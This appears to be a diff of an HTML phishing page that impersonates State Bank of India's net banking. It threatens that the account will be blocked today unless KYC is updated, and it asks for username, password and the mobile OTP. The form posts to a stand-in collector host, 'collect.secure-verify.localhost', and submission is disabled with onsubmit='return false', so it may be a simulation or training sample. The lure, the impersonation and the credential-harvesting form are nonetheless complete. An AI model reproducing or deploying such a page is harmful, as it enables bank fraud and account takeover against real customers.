@@ -1,9 +1,9 @@
 <!doctype html><html><head><meta charset="utf-8"><title>SBI Net Banking - KYC Update</title>
-<style>body{font:16px/1.5 system-ui;margin:0}main{max-width:480px;margin:30px auto;padding:0 16px}input{display:block;width:100%;padding:8px;margin:6px 0 12px}</style></head>
+<style>:root{color-scheme:light}body{font:16px/1.5 system-ui;margin:0;background:#fff;color:#111}main{max-width:480px;margin:30px auto;padding:0 16px}input{display:block;width:100%;padding:8px;margin:6px 0 12px}</style></head>
 <body><main>
 <h1>State Bank KYC Update</h1>
 <p>Dear customer, your KYC is pending. Update now or your account will be blocked today.</p>
-<form action="http://collect.secure-verify.localhost/submit" onsubmit="return false">
+<form action="http://collect.secure-verify.localhost/submit" method="get" onsubmit="return false">
 <label for="user">Username</label><input id="user" name="user">
 <label for="pw">Password</label><input id="pw" type="password" name="pw">
 <label for="otp">Enter OTP sent to your mobile</label><input id="otp" name="otp">
